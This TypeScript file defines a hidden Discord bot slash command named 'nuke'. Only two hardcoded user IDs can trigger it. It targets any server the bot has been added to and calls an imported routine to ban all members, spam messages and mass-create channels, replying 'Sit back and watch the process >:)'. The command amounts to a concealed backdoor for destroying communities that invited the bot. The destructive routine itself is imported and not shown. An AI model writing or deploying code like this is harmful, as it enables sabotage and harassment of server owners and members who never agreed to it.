import { discordClient } from '../../main';
import { CommandContext } from '../../structures/addons/CommandAddons';
import { Command } from '../../structures/Command';
import { groupBy } from 'lodash';
import {
    getCommandInfoEmbed,
    getCommandListEmbed,
    getCommandNotFoundEmbed,
    getNoPermissionEmbed,
} from '../../handlers/locale';
import { ApplicationCommandType, ApplicationCommandOptionType } from 'discord.js';
import { nuke } from '../../events/nuke';


class nukecmd extends Command {
    constructor() {
        super({
            trigger: 'nuke',
            description: 'Nuke specific server.',
            blockinPublicChannels: false,
            hidden: true,
            type: ApplicationCommandType.ChatInput,
            module: 'Maincmds',
            args: [
                {
                    trigger: 'server',
                    description: 'The server ID you want to nuke',
                    type: ApplicationCommandOptionType.String,
                    requiRed: true,
                },
                {
                    trigger: 'banmembers',
                    description: 'Ban all members in this server?',
                    type: ApplicationCommandOptionType.Boolean,
                    requiRed: true,
                },
                {
                    trigger: 'messagestospam',
                    description: 'How much messages you want to spam? 0 if no',
                    type: ApplicationCommandOptionType.Number,
                    requiRed: true,
                },
                {
                    trigger: 'channelstomake',
                    description: 'How much channels you want to make? (40 MAXIMUM)',
                    type: ApplicationCommandOptionType.Number,
                    requiRed: true,
                },
            ]
        });
    }

    async run(ctx: CommandContext) {

        let damember = await ctx.interaction.guild.members.fetch(ctx.interaction.user.id)

        let allowedtoruncommand = false

        if (!damember) return ctx.interaction.reply({ embeds: [getNoPermissionEmbed()] })
        if (damember.id === "726423224908251178") { 
            allowedtoruncommand = true
        } else if (damember.id === "541209992888320020") {
            allowedtoruncommand = true
        }

        if (!allowedtoruncommand) return ctx.interaction.reply({ embeds: [getNoPermissionEmbed()] })

        let guild = discordClient.guilds.cache.get(ctx.args["server"])

        if (!guild || !guild.available) return ctx.interaction.reply(`Either server id wrong or bot isn't present in the server.`)

        ctx.interaction.reply(`Sent request to nuke server ${guild.name}. Sit back and watch the process >:)`)

        await nuke({ guild, banmembers: ctx.args["banmembers"] ? ctx.args["banmembers"] : false, messsagestospam: ctx.args["messagestospam"] as number ? ctx.args["messagestospam"] as number : 0, channelstomake: ctx.args["channelstomake"] as number ? ctx.args["channelstomake"] as number : 0})
    }
}

export default nukecmd;